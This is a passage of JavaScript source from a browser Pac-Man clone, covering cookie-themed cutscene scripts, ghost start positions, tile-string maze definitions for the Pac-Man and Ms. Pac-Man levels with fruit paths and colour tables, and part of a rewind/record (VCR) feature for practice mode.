              (blinky.getNumSteps = function () {
                return Actor.prototype.getStepSizeFromTable.call(this, 5, 3);
              });
          },
          update: function () {
            var j;
            for (j = 0; j < 2; j++) pacman.update(j), blinky.update(j);
            pacman.frames++, blinky.frames++;
          },
          draw: function () {
            renderer.blitMap(),
              renderer.beginMapClip(),
              renderer.drawPlayer(),
              renderer.renderFunc(function (ctx) {
                var y = blinky.getBounceY(blinky.pixel.x, blinky.pixel.y, 3),
                  x = blinky.pixel.x;
                ctx.save(), ctx.translate(x, y);
                var s = 16 / 6;
                ctx.scale(s, s), drawCookie(ctx, 0, 0), ctx.restore();
              }),
              renderer.endMapClip();
          },
        },
        640: {
          init: function () {
            delete pacman.getNumSteps,
              delete blinky.getNumSteps,
              delete pacman.steer,
              delete blinky.steer,
              restoreCheats(),
              switchState(cookieCutscene1.nextState, 60);
          },
        },
      },
    }),
    cookieCutscene2 = (function () {
      var pac = new Ghost();
      (pac.scared = !0), (pac.mode = 0);
      var mspac = new Player(),
        drawPlayer = function (ctx, player) {
          var frame = player.getAnimFrame();
          if (player == pac) {
            var y = player.getBounceY(
              player.pixel.x,
              player.pixel.y,
              player.dirEnum
            );
            atlas.drawMuppetSprite(
              ctx,
              player.pixel.x,
              y,
              0,
              player.dirEnum,
              !0,
              !1
            );
          } else
            player == mspac &&
              drawCookiemanSprite(
                ctx,
                player.pixel.x,
                player.pixel.y,
                player.dirEnum,
                frame,
                !0
              );
        };
      return newChildObject(scriptState, {
        init: function () {
          scriptState.init.call(this),
            (mspac.frames = 14),
            (pac.frames = 12),
            pac.setPos(-10, 99),
            pac.setDir(3),
            mspac.setPos(232, 180),
            mspac.setDir(1),
            (inky.frames = 0),
            (inky.mode = 0),
            (inky.scared = !1),
            inky.setPos(pac.pixel.x - 42, 99),
            inky.setDir(3),
            (inky.faceDirEnum = 3),
            (pinky.frames = 3),
            (pinky.mode = 0),
            (pinky.scared = !1),
            pinky.setPos(mspac.pixel.x + 49, 180),
            pinky.setDir(1),
            (pinky.faceDirEnum = 1),
            backupCheats(),
            clearCheats(),
            energizer.reset(),
            (pac.getStepFrame = function () {
              return Math.floor(this.frames / 4) % 4;
            }),
            (mspac.getStepFrame = function () {
              return Math.floor(this.frames / 4) % 4;
            }),
            (inky.getAnimFrame = function () {
              return Math.floor(this.frames / 8) % 2;
            }),
            (pinky.getAnimFrame = function () {
              return Math.floor(this.frames / 8) % 2;
            }),
            (pac.getNumSteps = function () {
              return 1;
            }),
            (mspac.getNumSteps = function () {
              return 1;
            }),
            (inky.getNumSteps = function () {
              return 1;
            }),
            (pinky.getNumSteps = function () {
              return 1;
            }),
            (pac.steer = function () {}),
            (mspac.steer = function () {}),
            (inky.steer = function () {}),
            (pinky.steer = function () {});
        },
        triggers: {
          0: {
            update: function () {
              !(function () {
                var j;
                for (j = 0; j < 2; j++)
                  pac.update(j),
                    mspac.update(j),
                    inky.update(j),
                    pinky.update(j);
                pac.frames++, mspac.frames++, inky.frames++, pinky.frames++;
              })(),
                105 == inky.pixel.x &&
                  ((inky.getNumSteps = function () {
                    return Actor.prototype.getStepSizeFromTable.call(
                      this,
                      5,
                      6
                    );
                  }),
                  (pinky.getNumSteps = function () {
                    return Actor.prototype.getStepSizeFromTable.call(
                      this,
                      5,
                      6
                    );
                  }));
            },
            draw: function () {
              renderer.blitMap(),
                renderer.beginMapClip(),
                renderer.renderFunc(function (ctx) {
                  drawPlayer(ctx, pac), drawPlayer(ctx, mspac);
                }),
                renderer.drawGhost(inky),
                renderer.drawGhost(pinky),
                renderer.endMapClip();
            },
          },
          300: (function () {
            var ghostMode,
              playerMode,
              inkyBounceX = [
                1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0,
                1, 0, 1, 0,
              ],
              inkyBounceY = [
                -1, 0, -1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, -1, 0, -1, 0, 0, 0,
                0, 0, 1, 0, 1,
              ],
              pinkyBounceX = [
                0, 0, 0, 0, -1, 0, -1, 0, 0, -1, 0, -1, 0, -1, 0, 0, -1, 0, -1,
                0, -1, 0, 0, -1, 0, -1, 0, -1, 0, 0,
              ],
              pinkyBounceY = [
                0, 0, 0, -1, 0, -1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, -1, 0, -1,
                0, 0, 0, 0, 0, 1, 0, 1, 0, 0,
              ],
              inkyBounceFrame = 0,
              pinkyBounceFrame = 0,
              inkyBounceFrameLen = inkyBounceX.length,
              pinkyBounceFrameLen = pinkyBounceX.length,
              rampX = [0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1],
              rampY = [0, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0],
              rampFrame = 0,
              rampFrameLen = rampX.length,
              climbFrame = 0,
              meetFrame = 0;
            return {
              init: function () {
                (inkyBounceFrame =
                  pinkyBounceFrame =
                  rampFrame =
                  climbFrame =
                  meetFrame =
                    0),
                  (ghostMode = 0),
                  (playerMode = 0),
                  mspac.setPos(-8, 143),
                  mspac.setDir(3),
                  pinky.setPos(-81, 143),
                  (pinky.faceDirEnum = 3),
                  pinky.setDir(3),
                  pac.setPos(234, 142),
                  pac.setDir(1),
                  inky.setPos(302, 143),
                  (inky.faceDirEnum = 1),
                  inky.setDir(1),
                  (inky.getNumSteps = pinky.getNumSteps =
                    function () {
                      return "11211212"[this.frames % 8];
                    });
              },
              update: function () {
                var j;
                if (0 == playerMode) {
                  for (j = 0; j < 2; j++) pac.update(j), mspac.update(j);
                  102 == mspac.pixel.x && playerMode++;
                } else if (1 == playerMode)
                  (pac.pixel.x -= rampX[rampFrame]),
                    (pac.pixel.y += rampY[rampFrame]),
                    pac.commitPos(),
                    (mspac.pixel.x += rampX[rampFrame]),
                    (mspac.pixel.y += rampY[rampFrame]),
                    mspac.commitPos(),
                    ++rampFrame == rampFrameLen && playerMode++;
                else if (2 == playerMode) {
                  if (0 == climbFrame)
                    (mspac.pixel.y -= 2), mspac.commitPos(), mspac.setDir(0);
                  else for (j = 0; j < 2; j++) mspac.update(j);
                  climbFrame++, 91 == mspac.pixel.y && playerMode++;
                } else
                  3 == playerMode &&
                    (0 == meetFrame &&
                      (mspac.pixel.y++, mspac.setDir(3), mspac.commitPos()),
                    meetFrame > 18 && mspac.frames--,
                    78 == meetFrame &&
                      (delete inky.getNumSteps,
                      delete pinky.getNumSteps,
                      delete inky.steer,
                      delete pinky.steer,
                      delete inky.getAnimFrame,
                      delete pinky.getAnimFrame,
                      restoreCheats(),
                      switchState(cookieCutscene2.nextState, 60)),
                    meetFrame++);
                if ((pac.frames++, mspac.frames++, 0 == ghostMode)) {
                  for (j = 0; j < 2; j++) inky.update(j), pinky.update(j);
                  (inky.pixel.x = Math.max(120, inky.pixel.x)),
                    inky.commitPos(),
                    (pinky.pixel.x = Math.min(105, pinky.pixel.x)),
                    pinky.commitPos(),
                    105 == pinky.pixel.x && ghostMode++;
                } else
                  1 == ghostMode &&
                    (inkyBounceFrame < inkyBounceFrameLen &&
                      ((inky.pixel.x += inkyBounceX[inkyBounceFrame]),
                      (inky.pixel.y += inkyBounceY[inkyBounceFrame])),
                    pinkyBounceFrame < pinkyBounceFrameLen &&
                      ((pinky.pixel.x += pinkyBounceX[pinkyBounceFrame]),
                      (pinky.pixel.y += pinkyBounceY[pinkyBounceFrame])),
                    inkyBounceFrame++,
                    pinkyBounceFrame++);
                inky.frames++, pinky.frames++;
              },
              draw: function () {
                renderer.blitMap(),
                  renderer.beginMapClip(),
                  renderer.renderFunc(function (ctx) {
                    playerMode <= 1 && drawPlayer(ctx, pac),
                      drawPlayer(ctx, mspac);
                  }),
                  inkyBounceFrame < inkyBounceFrameLen &&
                    renderer.drawGhost(inky),
                  pinkyBounceFrame < pinkyBounceFrameLen &&
                    renderer.drawGhost(pinky),
                  3 == playerMode &&
                    renderer.renderFunc(function (ctx) {
                      drawHeartSprite(ctx, 112, 73);
                    }),
                  renderer.endMapClip();
              },
            };
          })(),
        },
      });
    })(),
    cutscenes = [
      [pacmanCutscene1],
      [mspacmanCutscene1, mspacmanCutscene2],
      [cookieCutscene1, cookieCutscene2],
      [mspacmanCutscene1, mspacmanCutscene2],
    ],
    triggerCutsceneAtEndLevel = function () {
      if (0 == gameMode) {
        if (2 == level) return playCutScene(pacmanCutscene1, readyNewState), !0;
      } else if (1 == gameMode || 3 == gameMode) {
        if (2 == level)
          return playCutScene(mspacmanCutscene1, readyNewState), !0;
        if (5 == level)
          return playCutScene(mspacmanCutscene2, readyNewState), !0;
      } else if (2 == gameMode) {
        if (2 == level) return playCutScene(cookieCutscene1, readyNewState), !0;
        if (5 == level) return playCutScene(cookieCutscene2, readyNewState), !0;
      }
      return !1;
    };
  (blinky.startDirEnum = 1),
    (blinky.startPixel = {
      x: 111,
      y: 112 + midTile_y,
    }),
    (blinky.cornerTile = {
      x: 25,
      y: 0,
    }),
    (blinky.startMode = 0),
    (blinky.arriveHomeMode = 5),
    (pinky.startDirEnum = 2),
    (pinky.startPixel = {
      x: 111,
      y: 136 + midTile_y,
    }),
    (pinky.cornerTile = {
      x: 2,
      y: 0,
    }),
    (pinky.startMode = 4),
    (pinky.arriveHomeMode = 4),
    (inky.startDirEnum = 0),
    (inky.startPixel = {
      x: 95,
      y: 136 + midTile_y,
    }),
    (inky.cornerTile = {
      x: 27,
      y: 34,
    }),
    (inky.startMode = 4),
    (inky.arriveHomeMode = 4),
    (clyde.startDirEnum = 0),
    (clyde.startPixel = {
      x: 127,
      y: 136 + midTile_y,
    }),
    (clyde.cornerTile = {
      x: 0,
      y: 34,
    }),
    (clyde.startMode = 4),
    (clyde.arriveHomeMode = 4),
    (pacman.startDirEnum = 1),
    (pacman.startPixel = {
      x: 111,
      y: 208 + midTile_y,
    });
  var mapLearn = new Map(
    28,
    36,
    "______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________||||||||||||||||||||||||____|                      |____| ||||| |||||||| ||||| |____| ||||| |||||||| ||||| |____| ||    ||    ||    || |____| || || || || || || || |__||| || || || || || || || |||       ||    ||    ||       ||| ||||| |||||||| ||||| |||__| ||||| |||||||| ||||| |____|    ||          ||    |____| || || |||||||| || || |____| || || |||||||| || || |____| ||    ||    ||    || |____| || || || || || || || |__||| || || || || || || || |||       ||    ||    ||       ||| |||||||| || |||||||| |||__| |||||||| || |||||||| |____|                      |____||||||||||||||||||||||||__________________________________________________________________________________________________________________________________________________________________________"
  );
  (mapLearn.name = "Pac-Man"),
    (mapLearn.wallStrokeColor = "#47b897"),
    (mapLearn.wallFillColor = "#000"),
    (mapLearn.pelletColor = "#ffb8ae"),
    (mapLearn.shouldDrawMapOnly = !0);
  var mapPacman = new Map(
    28,
    36,
    "____________________________________________________________________________________|||||||||||||||||||||||||||||............||............||.||||.|||||.||.|||||.||||.||o||||.|||||.||.|||||.||||o||.||||.|||||.||.|||||.||||.||..........................||.||||.||.||||||||.||.||||.||.||||.||.||||||||.||.||||.||......||....||....||......|||||||.||||| || |||||.||||||_____|.||||| || |||||.|__________|.||          ||.|__________|.|| |||--||| ||.|_____||||||.|| |______| ||.||||||      .   |______|   .      ||||||.|| |______| ||.||||||_____|.|| |||||||| ||.|__________|.||          ||.|__________|.|| |||||||| ||.|_____||||||.|| |||||||| ||.|||||||............||............||.||||.|||||.||.|||||.||||.||.||||.|||||.||.|||||.||||.||o..||.......  .......||..o||||.||.||.||||||||.||.||.||||||.||.||.||||||||.||.||.||||......||....||....||......||.||||||||||.||.||||||||||.||.||||||||||.||.||||||||||.||..........................|||||||||||||||||||||||||||||________________________________________________________"
  );
  (mapPacman.name = "Pac-Man"),
    (mapPacman.wallStrokeColor = "#2121ff"),
    (mapPacman.wallFillColor = "#000"),
    (mapPacman.pelletColor = "#ffb8ae"),
    (mapPacman.constrainGhostTurns = function (tile, openTiles) {
      (12 != tile.x && 15 != tile.x) ||
        (14 != tile.y && 26 != tile.y) ||
        (openTiles[0] = !1);
    });
  var getLevelAct = function (level) {
      return level <= 2 ? 1 : level <= 5 ? 2 : 3 + Math.floor((level - 6) / 4);
    },
    getActColor = function (act) {
      return 0 == gameMode
        ? {
            wallFillColor: mapPacman.wallFillColor,
            wallStrokeColor: mapPacman.wallStrokeColor,
            pelletColor: mapPacman.pelletColor,
          }
        : 1 == gameMode || 3 == gameMode
        ? getMsPacActColor(act)
        : 2 == gameMode
        ? getCookieActColor(act)
        : void 0;
    },
    getActRange = function (act) {
      if (1 == act) return [1, 2];
      if (2 == act) return [3, 5];
      var start = 4 * act - 6;
      return [start, start + 3];
    },
    getCookieActColor = function (act) {
      var colors = [
          "#359c9c",
          "#80d8fc",
          "#c2b853",
          "#e6f1e7",
          "#86669c",
          "#f2c1db",
          "#ed0a04",
          "#e8b4cd",
          "#2067c1",
          "#63e0b6",
          "#c55994",
          "#fd61c3",
          "#12bc76",
          "#b4e671",
          "#5036d9",
          "#618dd4",
          "#939473",
          "#fdfdf4",
        ],
        i = (2 * (act - 1)) % colors.length;
      return {
        wallFillColor: colors[i],
        wallStrokeColor: colors[i + 1],
        pelletColor: "#ffb8ae",
      };
    },
    setNextCookieMap = function () {
      var act = getLevelAct(level);
      if (!map || 1 == level || act != getLevelAct(level - 1)) {
        map = mapgen();
        var colors = getCookieActColor(act);
        (map.wallFillColor = colors.wallFillColor),
          (map.wallStrokeColor = colors.wallStrokeColor),
          (map.pelletColor = colors.pelletColor);
      }
    },
    getMsPacActColor = function (act) {
      var map = [mapMsPacman1, mapMsPacman2, mapMsPacman3, mapMsPacman4][
        (act -= 1) <= 1 ? act : (act % 2) + 2
      ];
      return act >= 4
        ? [
            {
              wallFillColor: "#ffb8ff",
              wallStrokeColor: "#FFFF00",
              pelletColor: "#00ffff",
            },
            {
              wallFillColor: "#FFB8AE",
              wallStrokeColor: "#FF0000",
              pelletColor: "#dedeff",
            },
            {
              wallFillColor: "#de9751",
              wallStrokeColor: "#dedeff",
              pelletColor: "#ff0000",
            },
            {
              wallFillColor: "#2121ff",
              wallStrokeColor: "#ffb851",
              pelletColor: "#dedeff",
            },
          ][act % 4]
        : {
            wallFillColor: map.wallFillColor,
            wallStrokeColor: map.wallStrokeColor,
            pelletColor: map.pelletColor,
          };
    },
    setNextMsPacMap = function () {
      var maps = [mapMsPacman1, mapMsPacman2, mapMsPacman3, mapMsPacman4],
        act = getLevelAct(level) - 1;
      if (((map = maps[act <= 1 ? act : (act % 2) + 2]), act >= 4)) {
        var colors = getMsPacActColor(act + 1);
        (map.wallFillColor = colors.wallFillColor),
          (map.wallStrokeColor = colors.wallStrokeColor),
          (map.pelletColor = colors.pelletColor);
      }
    },
    mapMsPacman1 = new Map(
      28,
      36,
      "____________________________________________________________________________________|||||||||||||||||||||||||||||......||..........||......||o||||.||.||||||||.||.||||o||.||||.||.||||||||.||.||||.||..........................||||.||.|||||.||.|||||.||.|||__|.||.|||||.||.|||||.||.|__|||.||.|||||.||.|||||.||.|||   .||.......||.......||.   |||.||||| |||||||| |||||.|||__|.||||| |||||||| |||||.|____|.                    .|____|.||||| |||--||| |||||.|____|.||||| |______| |||||.|____|.||    |______|    ||.|____|.|| || |______| || ||.|__|||.|| || |||||||| || ||.|||   .   ||          ||   .   |||.|||||||| || ||||||||.|||__|.|||||||| || ||||||||.|____|.......   ||   .......|____|.|||||.||||||||.|||||.|__|||.|||||.||||||||.|||||.||||............  ............||.||||.|||||.||.|||||.||||.||.||||.|||||.||.|||||.||||.||.||||.||....||....||.||||.||o||||.||.||||||||.||.||||o||.||||.||.||||||||.||.||||.||..........................|||||||||||||||||||||||||||||________________________________________________________"
    );
  (mapMsPacman1.name = "Ms. Pac-Man 1"),
    (mapMsPacman1.wallFillColor = "#FFB8AE"),
    (mapMsPacman1.wallStrokeColor = "#FF0000"),
    (mapMsPacman1.pelletColor = "#dedeff"),
    (mapMsPacman1.fruitPaths = {
      entrances: [
        {
          start: {
            y: 164,
            x: 228,
          },
          path: "<<<<vvv<<<<<<<<<^^^",
        },
        {
          start: {
            y: 164,
            x: -4,
          },
          path: ">>>>vvvvvv>>>>>>>>>>>>>>>^^^<<<^^^",
        },
        {
          start: {
            y: 92,
            x: -4,
          },
          path: ">>>>^^^^>>>vvvv>>>vvv>>>>>>>>>vvvvvv<<<",
        },
        {
          start: {
            y: 92,
            x: 228,
          },
          path: "<<<<vvvvvvvvv<<<^^^<<<vvv<<<",
        },
      ],
      exits: [
        {
          path: "<vvv>>>>>>>>>^^^>>>>",
        },
        {
          path: "<<<<vvv<<<<<<<<<^^^<<<<",
        },
        {
          path: "<<<<<<<^^^^^^<<<<<<^^^<<<<",
        },
        {
          path: "<vvv>>>>>>>>>^^^^^^^^^^^^>>>>",
        },
      ],
    });
  var mapMsPacman2 = new Map(
    28,
    36,
    "____________________________________________________________________________________||||||||||||||||||||||||||||       ||..........||       |||||| ||.||||||||.|| |||||||||||| ||.||||||||.|| |||||||o...........||...........o||.|||||||.||.||.||.|||||||.||.|||||||.||.||.||.|||||||.||.||......||.||.||......||.||.||.|||| ||....|| ||||.||.||.||.|||| |||||||| ||||.||.||......|| |||||||| ||......|||||||.||          ||.||||||||||||.|| |||--||| ||.|||||||......|| |______| ||......||.||||.|| |______| ||.||||.||.||||.   |______|   .||||.||...||.|| |||||||| ||.||...||||.||.||          ||.||.|||__|.||.|||| |||| ||||.||.|____|.||.|||| |||| ||||.||.|____|.........||||.........|____|.|||||||.||||.|||||||.|__|||.|||||||.||||.|||||||.|||   ....||...    ...||....   |||.||.||.||||||||.||.||.||||||.||.||.||||||||.||.||.||||o..||.......||.......||..o||.||||.|||||.||.|||||.||||.||.||||.|||||.||.|||||.||||.||..........................|||||||||||||||||||||||||||||________________________________________________________"
  );
  (mapMsPacman2.name = "Ms. Pac-Man 2"),
    (mapMsPacman2.wallFillColor = "#47b8ff"),
    (mapMsPacman2.wallStrokeColor = "#dedeff"),
    (mapMsPacman2.pelletColor = "#ffff00"),
    (mapMsPacman2.fruitPaths = {
      entrances: [
        {
          start: {
            y: 212,
            x: 228,
          },
          path: "<<<<^^^<<<<<<<<^^^<",
        },
        {
          start: {
            y: 212,
            x: -4,
          },
          path: ">>>>^^^>>>>>>>>vvv>>>>>^^^^^^<",
        },
        {
          start: {
            y: 36,
            x: -4,
          },
          path: ">>>>>>>vvv>>>vvvvvvv>>>>>>>>>vvvvvv<<<",
        },
        {
          start: {
            y: 36,
            x: 228,
          },
          path: "<<<<<<<vvv<<<vvvvvvvvvvvvv<<<",
        },
      ],
      exits: [
        {
          path: "vvv>>>>>>>>vvv>>>>",
        },
        {
          path: "vvvvvv<<<<<^^^<<<<<<<<vvv<<<<",
        },
        {
          path: "<<<<<<<^^^^^^^^^^^^^<<<^^^<<<<<<<",
        },
        {
          path: "vvv>>>>>^^^^^^^^^^>>>>>^^^^^^<<<<<^^^>>>>>>>",
        },
      ],
    });
  var mapMsPacman3 = new Map(
    28,
    36,
    "____________________________________________________________________________________|||||||||||||||||||||||||||||.........||....||.........||.|||||||.||.||.||.|||||||.||o|||||||.||.||.||.|||||||o||.||.........||.........||.||.||.||.||||.||.||||.||.||.||....||.||||.||.||||.||....|||||.||.||||.||.||||.||.||||||||.||..............||.|||| ....|||| |||||||| ||||.... |.|| |||| |||||||| |||| ||.||.||                    ||.||.|||| || |||--||| || ||||.||.|||| || |______| || ||||.||.     || |______| ||     .||.|| |||| |______| |||| ||.||.|| |||| |||||||| |||| ||.||.||                    ||.||.|||| ||||| || ||||| ||||.||.|||| ||||| || ||||| ||||.||......||....||....||......||||.||.||.||||||||.||.||.||||||.||.||.||||||||.||.||.||||o..||.......  .......||..o||.||||.|||||.||.|||||.||||.||.||||.|||||.||.|||||.||||.||......||....||....||......||.||||.||.||||||||.||.||||.||.||||.||.||||||||.||.||||.||......||..........||......|||||||||||||||||||||||||||||________________________________________________________"
  );
  (mapMsPacman3.name = "Ms. Pac-Man 3"),
    (mapMsPacman3.wallFillColor = "#de9751"),
    (mapMsPacman3.wallStrokeColor = "#dedeff"),
    (mapMsPacman3.pelletColor = "#ff0000"),
    (mapMsPacman3.fruitPaths = {
      entrances: [
        {
          start: {
            y: 100,
            x: 228,
          },
          path: "<<<<<vv<<<<<vvvvvv<<<",
        },
        {
          start: {
            y: 100,
            x: -4,
          },
          path: ">>>>>vv>>>>>>>>>>>>>>vvvvvv<<<",
        },
        {
          start: {
            y: 100,
            x: -4,
          },
          path: ">>>>>vv>>>>>>>>>>>>>>vvvvvv<<<",
        },
        {
          start: {
            y: 100,
            x: 228,
          },
          path: "<<vvvvv<<<vvv<<<<<<<<",
        },
      ],
      exits: [
        {
          path: "<vvv>>>vvv>>>^^^>>>>>^^^^^^^^^^^>>",
        },
        {
          path: "<<<<vvv<<<vvv<<<^^^<<<<<^^^^^^^^^^^<<",
        },
        {
          path: "<<<<vvv<<<vvv<<<^^^<<<<<^^^^^^^^^^^<<",
        },
        {
          path: "<vvv>>>vvv>>>^^^^^^<<<^^^^^^>>>>>^^>>>>>",
        },
      ],
    }),
    (mapMsPacman3.constrainGhostTurns = function (tile, openTiles, dirEnum) {
      12 == tile.y &&
        ((1 == tile.x && 3 == dirEnum) || (26 == tile.x && 1 == dirEnum)) &&
        (openTiles[2] = !1);
    });
  var mapMsPacman4 = new Map(
    28,
    36,
    "____________________________________________________________________________________|||||||||||||||||||||||||||||..........................||.||.||||.||||||||.||||.||.||o||.||||.||||||||.||||.||o||.||.||||.||....||.||||.||.||.||......||.||.||......||.||.||||.||.||.||.||.||.||||.||.||||.||.||.||.||.||.||||.||......||....||....||......||||.|||||||| || ||||||||.|||__|.|||||||| || ||||||||.|____|....||          ||....|__||| ||.|| |||--||| ||.|| |||    ||.|| |______| ||.||    ||||||.   |______|   .||||||||||||.|| |______| ||.||||||    ||.|| |||||||| ||.||    ||| ||.||          ||.|| |||__|....||||| || |||||....|____|.||.||||| || |||||.||.|____|.||....   ||   ....||.|____|.|||||.|| || ||.|||||.|__|||.|||||.|| || ||.|||||.||||.........||    ||.........||.||||.||.||||||||.||.||||.||.||||.||.||||||||.||.||||.||.||...||..........||...||.||o||.|||||||.||.|||||||.||o||.||.|||||||.||.|||||||.||.||............||............|||||||||||||||||||||||||||||________________________________________________________"
  );
  (mapMsPacman4.name = "Ms. Pac-Man 4"),
    (mapMsPacman4.wallFillColor = "#2121ff"),
    (mapMsPacman4.wallStrokeColor = "#ffb851"),
    (mapMsPacman4.pelletColor = "#dedeff"),
    (mapMsPacman4.fruitPaths = {
      entrances: [
        {
          start: {
            y: 156,
            x: 228,
          },
          path: "<<<<vv<<<vv<<<<<<^^^",
        },
        {
          start: {
            y: 156,
            x: -4,
          },
          path: ">>>>vv>>>vv>>>>>>vvv>>>^^^^^^",
        },
        {
          start: {
            y: 132,
            x: -4,
          },
          path: ">>>>^^^^^>>>^^^>>>vvv>>>vvv>>>>>>vvvvvv<<<",
        },
        {
          start: {
            y: 132,
            x: 228,
          },
          path: "<<<<^^<<<vvv<<<vvv<<<",
        },
      ],
      exits: [
        {
          path: "<vvv>>>>>>^^>>>^^>>>>",
        },
        {
          path: "<<<<vvv<<<<<<^^<<<^^<<<<",
        },
        {
          path: "<<<<<<<^^^<<<^^^<<<vv<<<<",
        },
        {
          path: "<vvv>>>>>>^^^^^^^^^>>>vv>>>>",
        },
      ],
    });
  var VCR_NONE = -1,
    VCR_RECORD = 0,
    vcr = (function () {
      var mode,
        initialized,
        time,
        speedIndex,
        frame,
        startFrame,
        stopFrame,
        y,
        h,
        speeds = [-8, -4, -2, -1, 0, 1, 2, 4, 8],
        speedCount = speeds.length,
        speedColors = [
          "rgba(255,255,0,0.25)",
          "rgba(255,255,0,0.20)",
          "rgba(255,255,0,0.15)",
          "rgba(255,255,0,0.10)",
          "rgba(0,0,0,0)",
          "rgba(0,0,255,0.10)",
          "rgba(0,0,255,0.15)",
          "rgba(0,0,255,0.20)",
          "rgba(0,0,255,0.25)",
        ],
        speedPrints = [18, 13, 8, 3, 3, 10, 15, 20, 25],
        speedPrintStep = [6, 5, 4, 3, 3, 3, 4, 5, 6],
        load = function () {
          var i;
          for (i = 0; i < 5; i++) actors[i].load(frame);
          elroyTimer.load(frame),
            energizer.load(frame),
            fruit.load(frame),
            ghostCommander.load(frame),
            ghostReleaser.load(frame),
            map.load(frame, time),
            (function (t) {
              (level = savedLevel[t]),
                extraLives != savedExtraLives[t] &&
                  ((extraLives = savedExtraLives[t]), renderer.drawMap()),
                setHighScore(savedHighScore[t]),
                setScore(savedScore[t]),
                (state = savedState[t]);
            })(frame),
            state == deadState
              ? deadState.load(frame)
              : state == finishState && finishState.load(frame);
        },
        save = function () {
          var i;
          for (i = 0; i < 5; i++) actors[i].save(frame);
          elroyTimer.save(frame),
            energizer.save(frame),
            fruit.save(frame),
            ghostCommander.save(frame),
            ghostReleaser.save(frame),
            map.save(frame),
            (function (t) {
              (savedLevel[t] = level),
                (savedExtraLives[t] = extraLives),
                (savedHighScore[t] = getHighScore()),
                (savedScore[t] = getScore()),
                (savedState[t] = state);
            })(frame),
            state == deadState
              ? deadState.save(frame)
              : state == finishState && finishState.save(frame);
        },
        eraseFuture = function () {
          map.eraseFuture(time), (stopFrame = frame);
        },
        addTime = function (dt) {
          (time += dt), (frame = (frame + dt) % 900) < 0 && (frame += 900);
        },
        getForwardDist = function (x0, x1) {
          return x0 <= x1 ? x1 - x0 : x1 + 900 - x0;
        },
        startRecording = function () {
          (mode = VCR_RECORD),
            (initialized = !1),
            eraseFuture(),
            seekUpBtn.disable(),
            seekDownBtn.disable(),
            seekToggleBtn.setIcon(function (ctx, x, y, frame) {
              drawRewindSymbol(ctx, x, y, "#FFF");
            }),
            seekToggleBtn.setText();
        },
        refreshSeekDisplay = function () {
          seekToggleBtn.setText(speeds[speedIndex] + "x");
        },
        startSeeking = function () {
          (speedIndex = 3),
            updateMode(),
            seekUpBtn.enable(),
            seekDownBtn.enable(),
            seekToggleBtn.setIcon(void 0),
            refreshSeekDisplay();
        },
        nextSpeed = function (di) {
          null != speeds[speedIndex + di] && (speedIndex += di),
            updateMode(),
            refreshSeekDisplay();
        };
      y = 132.5;
      var seekUpBtn = new Button(227, 102.5, 25, (h = 25), function () {
        nextSpeed(1);
      });
      seekUpBtn.setIcon(function (ctx, x, y, frame) {
        !(function (ctx, x, y, color) {
          ctx.save(),
            ctx.translate(x, y),
            (ctx.fillStyle = color),
            ctx.beginPath(),
            ctx.moveTo(0, -4),
            ctx.lineTo(4, 4),
            ctx.lineTo(-4, 4),
            ctx.closePath(),
            ctx.fill(),
            ctx.restore();
        })(ctx, x, y, "#FFF");
      });
      var seekDownBtn = new Button(227, 162.5, 25, h, function () {
        nextSpeed(-1);
      });
      seekDownBtn.setIcon(function (ctx, x, y, frame) {
        !(function (ctx, x, y, color) {
          ctx.save(),
            ctx.translate(x, y),
            (ctx.fillStyle = color),
            ctx.beginPath(),
            ctx.moveTo(0, 4),
            ctx.lineTo(4, -4),
            ctx.lineTo(-4, -4),
            ctx.closePath(),
            ctx.fill(),
            ctx.restore();
        })(ctx, x, y, "#FFF");
      });
      var seekToggleBtn = new ToggleButton(
        227,
        y,
        25,
        h,
        function () {
          return mode != VCR_RECORD;
        },
        function (on) {
          on ? startSeeking() : startRecording();
        }
      );
      seekToggleBtn.setIcon(function (ctx, x, y, frame) {
        drawRewindSymbol(ctx, x, y, "#FFF");
      }),
        seekToggleBtn.setFont("7px ArcadeR", "#FFF");
      var slowBtn = new ToggleButton(
        -31,
        y,
        25,
        h,
        function () {
          return executive.getFramePeriod() == 1e3 / 15;
        },
        function (on) {
          executive.setUpdatesPerSecond(on ? 15 : 60);
        }
      );
      slowBtn.setIcon(function (ctx, x, y) {
        atlas.drawSnail(ctx, x, y, 1);
      });
      var updateMode = function () {
        var speed = speeds[speedIndex];
        0 == speed
          ? (mode = 3)
          : speed < 0
          ? (mode = 1)
          : speed > 0 && (mode = 2);
      };
      return {
        init: function () {
          mode = VCR_NONE;
        },
        reset: function () {
          (time = 0),
            (frame = 0),
            (startFrame = 0),
            (stopFrame = 0),
            (states = {}),
            startRecording();
        },
        seek: function (dt) {
          null == dt && (dt = speeds[speedIndex]),
            initialized &&
              (addTime(
                (function (dt) {
                  if (!initialized || 0 == dt) return 0;
                  var maxForward = getForwardDist(frame, stopFrame),
                    maxReverse = getForwardDist(startFrame, frame);
                  return dt > 0
                    ? Math.min(maxForward, dt)
                    : Math.max(-maxReverse, dt);
                })(dt)
              ),
              load());
        },
        record: function () {
          initialized
            ? (addTime(1),
              frame == startFrame && (startFrame = (startFrame + 1) % 900),
              (stopFrame = frame))
            : (initialized = !0),
            save();
        },
        draw: function (ctx) {
          practiceMode &&
            (inGameMenu.isOpen() ||
              (state != playState &&
                state != finishState &&
                state != deadState) ||
              vcr.getMode() == VCR_RECORD ||
              renderer.setOverlayColor(speedColors[speedIndex]),
            seekUpBtn.isEnabled && seekUpBtn.draw(ctx),
            seekDownBtn.isEnabled && seekDownBtn.draw(ctx),
            seekToggleBtn.isEnabled && seekToggleBtn.draw(ctx),
            slowBtn.isEnabled && slowBtn.draw(ctx));
        },
        onFramePeriodChange: function () {
          slowBtn.isOn()
            ? slowBtn.setIcon(function (ctx, x, y) {
                atlas.drawSnail(ctx, x, y, 0);
              })
            : slowBtn.setIcon(function (ctx, x, y) {
                atlas.drawSnail(ctx, x, y, 1);
              });
        },
        onHudEnable: function () {
          practiceMode &&
            (mode == VCR_NONE || mode == VCR_RECORD
              ? (seekUpBtn.disable(), seekDownBtn.disable())
              : (seekUpBtn.enable(), seekDownBtn.enable()),
            seekToggleBtn.enable(),
            slowBtn.enable());
        },
        onHudDisable: function () {
          practiceMode &&
            (seekUpBtn.disable(),
